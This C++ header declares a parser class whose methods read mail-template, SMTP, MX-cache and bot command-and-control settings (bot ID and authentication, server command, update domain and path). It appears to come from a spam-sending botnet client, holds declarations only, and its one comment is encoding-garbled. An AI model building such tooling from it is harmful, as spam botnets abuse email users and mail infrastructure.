#ifndef TypeSelectorH
#define TypeSelectorH

#include <string>
#include <list>
#include <string>
#include "../common/dbg_prn.h"
#include "tag_types.h"

namespace Parser
{
  //
  // Ìףכüעטלועמה.
  //
	
  struct TagTypeSelector
  {
	  TagTypeSelector::TagTypeSelector(unsigned long _type);

    void  getMetadata(const std::string &str,
					  meta_data_type &metadata,
					  bool inc_count);
    private:
    void  get_mail_subj( const char *str,meta_data_type &metadata);     
    void  get_report_freq( const char *str,meta_data_type &metadata);
	  void  get_threads(const char *str,meta_data_type &metadata);
	  void  get_tid	(const char *str,meta_data_type &metadata);
	  void  get_timeout	(const char *str,meta_data_type &metadata);  
	  void  get_sleep	(const char *str,meta_data_type &metadata);
    void  get_mxcache	(const char *str,meta_data_type &metadata);
    void  get_letter_form  (const char *str,meta_data_type &metadata);
    void  get_charset (const char *str,meta_data_type &metadata);
    void  get_mail_from  (const char *str,meta_data_type &metadata);
    void  get_mail_to  (const char *str,meta_data_type &metadata);
    void  get_smtp_srv (const char *str,meta_data_type &metadata);
    void  get_body(const char *str,meta_data_type &metadata);
	  void  get_header(const char *str,meta_data_type &metadata);
    void  get_mx_bad_count(const char *str,meta_data_type &metadata);
    void  error_type(const char *str,meta_data_type &metadata);
    void  get_body_macros (const char *str,meta_data_type &metadata);
    void  get_head_macros (const char *str,meta_data_type &metadata);
    void  get_bot_id (const char *str,meta_data_type &metadata);
    void  get_bot_auth (const char *str,meta_data_type &metadata);
    void  get_bot_task_present (const char *str,meta_data_type &metadata);
    void  get_bot_id_exist(const char *str,meta_data_type &metadata);
    void  get_bot_ret_error(const char *str,meta_data_type &metadata);
    void get_bot_srv_domain
        (const char *str,meta_data_type &metadata);
    void get_bot_srv_cmd
        (const char *str,meta_data_type &metadata);
    void get_bot_upd_domain
        (const char *str,meta_data_type &metadata);
    void get_bot_upd_path
        (const char *str,meta_data_type &metadata);
    void get_rnd_level(const char *str,meta_data_type &metadata);
    void get_links_list(const char *str,
  			        meta_data_type &metadata);
    void get_links_xchg_count
      ( const char *str,meta_data_type &metadata);     

    //mail_macros
    void (TagTypeSelector::*ptr[meta_data_type::ELEMENT_COUNT])(const char *str,
				  meta_data_type &metadata);
	  enum {ptr_count = meta_data_type::ELEMENT_COUNT};
	  unsigned long _type;
	  bool _inc_count;
  };
};

#endif